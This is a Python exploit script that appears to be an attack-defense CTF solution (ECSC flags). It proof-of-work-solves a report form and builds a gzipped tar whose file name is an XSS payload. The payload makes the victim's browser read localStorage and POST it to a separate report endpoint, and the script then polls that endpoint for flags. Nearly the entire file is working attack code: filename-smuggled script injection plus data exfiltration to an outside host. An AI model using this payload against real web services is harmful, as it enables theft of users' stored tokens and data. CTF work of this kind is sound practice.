#!/usr/bin/env python3

import base64
import re
import sys
import time
import requests
from os import urandom
from hashlib import sha256
from base64 import b64encode, b64decode

FLAG_REGEX = 'ECSC_.{32}'

report_url = ''
service_url = ''

def crack(salt, suffix):
    seq = b''
    while not sha256(salt + seq).digest().endswith(suffix):
        seq = urandom(8)
    return b64encode(seq)


def send_link(message):
    '''
    Sends a link and returns the UUID.
    '''
    s = requests.Session()
    r = s.get(report_url)
    
    b64salt = re.findall('salt \(b64-encoded\) <code>(.*?)</code>', r.text)[0]
    b64suffix = re.findall('suffix \(b64-encoded\) <code>(.*?)</code>', r.text)[0]
    salt = b64decode(b64salt)
    suffix = b64decode(b64suffix)
    
    
    print(f'Cracking {salt}, {suffix}')
    seq = crack(salt, suffix)
    print(f'Cracking done {seq}')

    r = s.post(report_url, data={'pow': seq, 'link': message})
    try:
        link_uuid = re.findall('<a href="/report/(.*?)">here', r.text)[0]
    except Exception as e:
        print(r.text)
        raise e

    return link_uuid


def check_messages(link_uuid):
    '''
    Returns the messages sent to the given link UUID.
    '''
    r = requests.get(f'{report_url}/report/{link_uuid}')
    return r.text


def get_payload(link_uuid):
    '''
    Returns the link containing the payload.
    '''
    import io, tarfile

    payload_js = '''fetch("%s/report/%s",{headers:{"content-type":"application/x-www-form-urlencoded"},body:"message="+Object.values(localStorage),method:"POST",mode:"no-cors"});''' % (report_url.replace('//', '\\/\\/'), link_uuid)

    payload_html = "<img src=a onerror={}>".format(payload_js)

    payload = b'hello'
    fh = io.BytesIO()
    with tarfile.open(fileobj=fh, mode='w:gz') as tar:
        info = tarfile.TarInfo(payload_html)
        info.size = len(payload)
        info.mode = 0000
        tar.addfile(info, io.BytesIO(payload))

    return '{}/analyze#{}@{}'.format(
        service_url,
        b64encode(b'foobar.tar.gz').decode(),
        b64encode(fh.getvalue()).decode()
    )


def main():
    global report_url, service_url

    ip = sys.argv[1]
    report_url  = f'http://{ip}:11111'
    service_url = f'http://{ip}:10010'

    link_uuid = send_link(service_url)
    print(f'Observing {link_uuid}')

    payload_link = get_payload(link_uuid)
    send_link(payload_link)

    while True:
        t = check_messages(link_uuid)
        parts = t.split(',')
        if parts:
            for part in parts:
                try:
                    out = base64.b64decode(part)
                    if re.match(FLAG_REGEX, out.decode()):
                        print(out.decode())
                except Exception as e:
                    pass

        time.sleep(5)
    

if __name__ == '__main__':
    main()
